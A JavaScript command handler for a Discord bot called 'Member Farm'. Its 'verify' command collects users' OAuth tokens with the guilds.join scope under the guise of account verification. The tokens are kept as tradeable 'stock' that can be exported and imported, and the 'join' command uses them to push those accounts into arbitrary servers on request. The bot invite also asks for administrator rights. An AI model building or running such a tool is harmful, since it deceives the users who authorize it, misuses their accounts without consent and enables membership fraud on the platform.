// language: JavaScript, file: commands_core.js - Postgres async
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits } = require('discord.js');
const { query, one, many, getSetting, setSetting } = require('./db');
const config = require('./config');
const perms = require('./permissions');
const logs = require('./logs');
const queue = require('./queue');
const { handleExtra } = require('./extra_commands');
const { buildHelpPayload, buildHelpEmbed } = require('./help');
const { getEmbedColor } = require('./embed_util');
const { handleTokenList } = require('./token_cmd');

async function getPrefix() {
  return (await getSetting('prefix', config.DEFAULT_PREFIX)) || config.DEFAULT_PREFIX;
}

function confirmRow(id) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_${id}`).setLabel('Confirm').setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId(`decline_${id}`).setLabel('Decline').setStyle(ButtonStyle.Secondary)
  );
}

async function handleCommand(message, client) {
  const prefix = await getPrefix();
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/\s+/);
  const cmd = (args.shift() || '').toLowerCase();
  if (!cmd) return;

  const mainGuild = config.MAIN_GUILD_ID || '1499704751481294878';
  if (cmd !== 'verify') {
    if (!message.guild || message.guild.id !== mainGuild) return;
  }

  if (message.guild) {
    const bl = await one('SELECT reason FROM blacklist WHERE guild_id = $1', [message.guild.id]);
    if (bl) return message.reply(`This server is blacklisted. Reason: ${bl.reason}`);
  }

  if ((await perms.isMaintenance()) && !(await perms.isMaintenanceAllowed(message.author.id)) && !perms.isOwner(message.author.id)) {
    return message.reply('Bot is currently under maintenance.');
  }

  const publicCmds = ['verify', 'bot', 'checkserver', 'help', 'join', 'status'];
  if (!publicCmds.includes(cmd) && !(await perms.canUse(message.author.id, cmd)) && !perms.isOwner(message.author.id)) return;

  if (cmd === 'token' && args[0] && ['export', 'import'].includes(String(args[0]).toLowerCase())) {
    await handleExtra('token', message, args, client, perms);
    return;
  }

  if (cmd === 'token') {
    await handleTokenList(message, client);
    return;
  }

  const brandColor = await getEmbedColor();

  try {
    switch (cmd) {
      case 'prefix': {
        if (args[0] === 'set' && args[1]) {
          if (!(await perms.canUse(message.author.id, 'prefix')) && !perms.isOwner(message.author.id)) return;
          await setSetting('prefix', args[1]);
          await message.reply(`Prefix set to \`${args[1]}\`);
          logs.adminLog(client, 'Prefix changed', `By <@${message.author.id}> → \`${args[1]}\`);
        }
        break;
      }
      case 'help': {
        await message.reply(await buildHelpPayload(prefix, brandColor, 'core', message.author.id));
        break;
      }
      case 'auth': {
        if (!(await perms.canUse(message.author.id, 'auth')) && !perms.isOwner(message.author.id)) return;
        const total = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1')).c;
        const stats = await one('SELECT * FROM auth_stats WHERE id = 1');
        const now = Math.floor(Date.now() / 1000);
        let last24 = stats?.last_24h || 0;
        if (now - Number(stats?.last_24h_reset || 0) > 86400) last24 = 0;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Auth Status').setColor(brandColor).addFields(
          { name: 'Current Valid', value: `\`${total}\``, inline: true },
          { name: 'Last 24h', value: `\`${last24}\``, inline: true },
          { name: 'All-Time', value: `\`${stats?.total_all_time || 0}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'restock': {
        if (!(await perms.canUse(message.author.id, 'restock')) && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: ' + prefix + 'restock <number>');
        const available = await many(`SELECT id FROM tokens WHERE valid = 1 AND id NOT IN (SELECT token_id FROM stock)`);
        if (n > available.length) return message.reply(`Only ${available.length} tokens available for restock.`);
        for (let i = available.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [available[i], available[j]] = [available[j], available[i]];
        }
        for (const t of available.slice(0, n)) await query('INSERT INTO stock (token_id) VALUES ($1) ON CONFLICT DO NOTHING', [t.id]);
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Restock Complete').setColor(0x57f287).addFields(
          { name: 'Added to Stock', value: `\`${n}\``, inline: true },
          { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'stock': {
        if (!(await perms.canUse(message.author.id, 'stock')) && !perms.isOwner(message.author.id)) return;
        const count = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Stock').setColor(brandColor).addFields(
          { name: 'Available', value: `\`${count}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'remove': {
        if (!(await perms.canUse(message.author.id, 'remove')) && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: ' + prefix + 'remove <number>');
        const rows = await many('SELECT token_id FROM stock LIMIT $1', [n]);
        if (!rows.length) return message.reply('Stock is empty.');
        for (const r of rows) await query('DELETE FROM stock WHERE token_id = $1', [r.token_id]);
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Stock Updated').setColor(0xed4245).addFields(
          { name: 'Removed', value: `\`${rows.length}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'bot': {
        const invite = config.BOT_INVITE || 'https://discord.com/oauth2/authorize?client_id=1559903456469196810&permissions=8&integration_type=0&scope=bot';
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot →').setStyle(ButtonStyle.Link).setURL(invite));
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Add the Bot').setDescription('Click the button below to add the bot to your server.').setColor(brandColor).setFooter({ text: 'Member Farm' }).setTimestamp()], components: [row] });
        break;
      }
      case 'grant': {
        if (!(await perms.canUse(message.author.id, 'grant')) && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'revoke') {
          const user = message.mentions.users.first();
          const what = (args[2] || 'all').toLowerCase().replace(/^!/, '');
          if (!user) return message.reply('Usage: ' + prefix + 'grant revoke @user <cmd|all>');
          await perms.revoke(user.id, what);
          await message.reply({ embeds: [new EmbedBuilder().setTitle('Permission Revoked').setColor(0xed4245).addFields(
            { name: 'User', value: `<@${user.id}>`, inline: true },
            { name: 'Command', value: `\`${what}\``, inline: true }
          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        } else {
          const user = message.mentions.users.first();
          const what = (args[1] || 'all').toLowerCase().replace(/^!/, '');
          if (!user) return message.reply('Usage: ' + prefix + 'grant @user <cmd|all>');
          await perms.grant(user.id, what);
          await message.reply({ embeds: [new EmbedBuilder().setTitle('Permission Granted').setColor(0x57f287).addFields(
            { name: 'User', value: `<@${user.id}>`, inline: true },
            { name: 'Command', value: `\`${what}\``, inline: true }
          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        }
        break;
      }
      case 'link': {
        if (args[0] === 'define') {
          if (!(await perms.canUse(message.author.id, 'link')) && !perms.isOwner(message.author.id)) return;
          const url = args.slice(1).join(' ');
          if (!url) return message.reply('Usage: ' + prefix + 'link define <url>');
          await setSetting('oauth_link', url);
          await message.reply({ embeds: [new EmbedBuilder().setTitle('OAuth Link Defined').setColor(0x57f287).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        } else {
          const url = await getSetting('oauth_link', process.env.REDIRECT_URI
            ? `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`
            : 'Not configured');
          await message.reply({ embeds: [new EmbedBuilder().setTitle('OAuth Authorize Link').setDescription(url).setColor(brandColor).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        }
        break;
      }
      case 'verify': {
        const url = await getSetting('oauth_link',
          `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI || '')}&response_type=code&scope=identify%20guilds.join`);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('—> Verify').setStyle(ButtonStyle.Link).setURL(url));
        await message.channel.send({ embeds: [new EmbedBuilder().setTitle('Account Verification').setDescription('Click the button below to authorize the bot (scope: guilds.join).').setColor(0x57f287).setFooter({ text: 'Member Farm' }).setTimestamp()], components: [row] });
        break;
      }
      case 'join': {
        const specialId = await getSetting('special_channel', config.SPECIAL_CHANNEL_ID);
        const specialName = await getSetting('special_channel_name', config.SPECIAL_CHANNEL_NAME);
        if (message.channel.id !== specialId && message.channel.name !== specialName) return message.reply('This command can only be used in the designated join channel.');
        const verifiedRole = await getSetting('verified_role', config.VERIFIED_ROLE_ID);
        if (verifiedRole && !message.member.roles.cache.has(verifiedRole)) return message.reply('You need the verified role to use this command.');
        const targetId = args[0];
        if (!targetId || !/^\d{17,20}$/.test(targetId)) return message.reply('Usage: ' + prefix + 'join <serverID>');
        if (!client.guilds.cache.get(targetId)) return message.reply('Bot is not in that server. Add the bot first.');
        const cd = parseInt(await getSetting('cooldown_ms', String(config.COOLDOWN_MS)), 10) || 0;
        if (cd > 0) {
          const last = await one('SELECT last_join FROM cooldowns WHERE user_id = $1', [message.author.id]);
          if (last && Date.now() - Number(last.last_join) < cd) return message.reply(`Cooldown active. Wait ${Math.ceil((cd - (Date.now() - Number(last.last_join))) / 1000)}s.`);
        }
        let amount = parseInt(await getSetting('base_send', String(config.BASE_SEND)), 10) || 2;
        for (const b of await many('SELECT role_id, bonus FROM role_bonus')) {
          if (message.member.roles.cache.has(b.role_id)) amount += b.bonus;
        }
        const stockCount = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        if (stockCount === 0) return message.reply(`Error. All stock account are alredy in ${targetId}`);
        const q = await queue.addToQueue(targetId, message.author.id, amount);
        if (!q.ok) return message.reply('Queue is full (max 10). Try later.');
        await query(`INSERT INTO cooldowns (user_id, last_join) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET last_join = EXCLUDED.last_join`, [message.author.id, Date.now()]);
        await query(`INSERT INTO profiles (user_id, commands_used, last_command_at) VALUES ($1, 1, EXTRACT(EPOCH FROM NOW())::BIGINT)
          ON CONFLICT (user_id) DO UPDATE SET commands_used = profiles.commands_used + 1, last_command_at = EXTRACT(EPOCH FROM NOW())::BIGINT`, [message.author.id]);
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Request Queued').setColor(0x57f287).addFields(
          { name: 'Members to Send', value: `\`${amount}\``, inline: true },
          { name: 'Server ID', value: `\`${targetId}\``, inline: true },
          { name: 'Queue Position', value: `\`${q.position}/${config.QUEUE_MAX}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        logs.farmLog(client, 'Join queued', `User <@${message.author.id}> → guild ${targetId} x${amount}`);
        break;
      }
      case 'channel': {
        if (args[0] === 'set') {
          if (!(await perms.canUse(message.author.id, 'channel')) && !perms.isOwner(message.author.id)) return;
          const ch = message.mentions.channels.first();
          if (!ch) return message.reply('Usage: ' + prefix + 'channel set #channel');
          await setSetting('special_channel', ch.id);
          await setSetting('special_channel_name', ch.name);
          await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Channel Set').setColor(0x57f287).addFields(
            { name: 'Channel', value: `${ch}`, inline: true }
          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        }
        break;
      }
      case 'checkserver': {
        const gid = args[0];
        if (!gid) return message.reply('Usage: ' + prefix + 'checkserver <serverID>');
        const g = client.guilds.cache.get(gid);
        if (!g) return message.reply('Bot is not in that server.');
        const stockC = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        const joined = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE guild_id = $1 AND success = 1', [gid])).c;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Server Info').setColor(brandColor).addFields(
          { name: 'Server Name', value: g.name, inline: true },
          { name: 'Server ID', value: `\`${gid}\``, inline: true },
          { name: 'Member Count', value: `\`${g.memberCount}\``, inline: true },
          { name: 'Members Obtained', value: `\`${joined}\``, inline: true },
          { name: 'Current Stock', value: `\`${stockC}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'queue': {
        if (!(await perms.canUse(message.author.id, 'queue')) && !perms.isOwner(message.author.id)) return;
        const sub = (args[0] || '').toLowerCase();
        if (!sub) {
          const rows = await queue.getQueue();
          if (!rows.length) return message.reply({ embeds: [new EmbedBuilder().setTitle('Queue').setDescription('Queue empty.').setColor(brandColor).setFooter({ text: 'Member Farm' }).setTimestamp()] });
          await message.reply({ embeds: [new EmbedBuilder().setTitle('Queue').setColor(brandColor).setDescription(rows.map(r => `**#${r.position}** \`${r.guild_id}\` ×${r.amount}`).join('\n')).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        } else if (sub === 'clear') {
          const id = `clearq_${Date.now()}`;
          client.pendingConfirms.set(id, { action: 'queue_clear', author: message.author.id });
          await message.reply({ content: 'Confirm clear entire queue?', components: [confirmRow(id)] });
        } else if (sub === 'remove') { await queue.removeFromQueue(args[1]); await message.reply(`Removed ${args[1]}`); }
        else if (sub === 'pause') { await queue.pauseQueue(); await message.reply('Queue paused'); }
        else if (sub === 'resume') { await queue.resumeQueue(); await message.reply('Queue resumed'); }
        else if (sub === 'priority') { await queue.setPriority(args[1]); await message.reply('Priority set'); }
        break;
      }
      case 'stats': {
        if (!(await perms.canUse(message.author.id, 'stats')) && !perms.isOwner(message.author.id)) return;
        const tokens = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1')).c;
        const stockC = (await one('SELECT COUNT(*)::int AS c FROM stock')).c;
        const qC = (await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`)).c;
        const joins = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE success = 1')).c;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Global Stats').setColor(0xfaa61a).addFields(
          { name: 'Valid Auths', value: `\`${tokens}\``, inline: true },
          { name: 'Stock', value: `\`${stockC}\``, inline: true },
          { name: 'Queue', value: `\`${qC}\``, inline: true },
          { name: 'Bot Guilds', value: `\`${client.guilds.cache.size}\``, inline: true },
          { name: 'Successful Joins', value: `\`${joins}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'profile': {
        if (!(await perms.canUse(message.author.id, 'profile')) && !perms.isOwner(message.author.id)) return;
        const user = message.mentions.users.first() || message.author;
        const p = (await one('SELECT * FROM profiles WHERE user_id = $1', [user.id])) || { members_received: 0, commands_used: 0, last_command_at: null };
        await message.reply({ embeds: [new EmbedBuilder().setTitle('User Profile').setColor(brandColor).addFields(
          { name: 'User', value: `<@${user.id}>`, inline: true },
          { name: 'User ID', value: `\`${user.id}\``, inline: true },
          { name: 'Members Received', value: `\`${p.members_received}\``, inline: true },
          { name: 'Commands Used', value: `\`${p.commands_used}\``, inline: true },
          { name: 'Last Command', value: p.last_command_at ? `<t:${p.last_command_at}:R>` : '`never`', inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      case 'cooldown': {
        if (!(await perms.canUse(message.author.id, 'cooldown')) && !perms.isOwner(message.author.id)) return;
        const sec = parseInt(args[0], 10);
        if (isNaN(sec) || sec < 0) return message.reply('Usage: ' + prefix + 'cooldown <seconds>');
        await setSetting('cooldown_ms', String(sec * 1000));
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Cooldown Updated').setColor(0x57f287).addFields(
          { name: 'Seconds', value: `\`${sec}\``, inline: true }
        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
        break;
      }
      default: {
        await handleExtra(cmd, message, args, client, perms);
        break;
      }
    }
  } catch (err) {
    console.error(err);
    await logs.errorLog(client, {
      botName: client.user?.username || 'Member Farm',
      command: cmd,
      userTag: message.author?.tag || 'unknown',
      userId: message.author?.id || '—',
      channelName: message.channel?.name || 'unknown',
      guildName: message.guild?.name || 'unknown',
      errorType: err?.name || 'Error',
      errorMessage: err?.message || String(err),
      traceback: err?.stack || String(err),
    });
    await message.reply('An error occurred.').catch(() => {});
  }
}

module.exports = { handleCommand, getPrefix };
